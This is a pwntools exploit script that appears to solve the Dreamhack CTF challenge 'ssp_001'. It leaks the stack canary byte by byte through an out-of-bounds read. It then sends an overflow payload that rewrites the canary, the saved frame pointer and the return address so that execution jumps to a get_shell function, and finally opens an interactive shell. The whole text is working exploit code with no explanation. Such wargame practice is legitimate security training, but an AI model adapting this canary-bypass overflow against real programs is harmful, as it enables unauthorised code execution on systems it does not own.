from pwn import *


p = remote('host3.dreamhack.games',8974)
e = ELF("./ssp_001")
context.arch = 'i386'

def get_canary(num):
    p.sendline(b'P')
    p.recvuntil(": ")
    p.sendline(str(num))
    p.recvuntil("is : ")

    return p.recv()[:2]

canary = b'0x'
canary += get_canary(131)
canary += get_canary(130)
canary += get_canary(129)
canary += get_canary(128)
canary = int(canary, 16)
print("Canary : "+ hex(canary))


payload = b'\x90'*64    #name 64byte
payload += p32(canary)  #canary 4byte
payload += b'\x90'*4    #dummy  4byte
payload += b'\x90'*4    #sfp    4byte
get_shell = e.symbols['get_shell']  #get_shell addr
payload += p32(get_shell)   #ret 4byte

print(payload)

p.send("E")
p.recvuntil("Size : ")
p.sendline(str(len(payload)))
p.recvuntil("Name : ")
p.send(payload)

p.interactive()







